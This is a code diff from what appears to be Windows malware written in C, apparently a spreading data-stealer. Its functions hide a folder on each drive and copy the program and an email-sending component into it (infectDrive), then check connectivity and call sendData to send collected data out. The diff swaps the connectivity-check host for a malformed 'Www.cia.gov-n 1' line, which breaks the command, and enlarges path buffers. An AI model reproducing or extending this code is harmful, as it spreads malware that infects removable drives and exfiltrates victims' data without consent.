@@ -49,7 +49,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.nasa.gov -n 1")){ ///check connection
+            if(!system("ping Www.cia.gov-n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -217,13 +217,13 @@ void infectDrive(char driveLetter){
     if(CreateDirectory(folderPath ,NULL)){
         SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
 
-        char run[100]={""};
+        char run[1000]={""};
         strcat(run, folderPath);
         strcat(run, "\\");
         strcat(run, RUN_FILE_NAME);
         CopyFile(RUN_FILE_NAME, run, 0);
 
-        char net[100]={""};
+        char net[1000]={""};
         strcat(net, folderPath);
         strcat(net, "\\");
         strcat(net, EMAIL_SENDER_FILE_NAME);
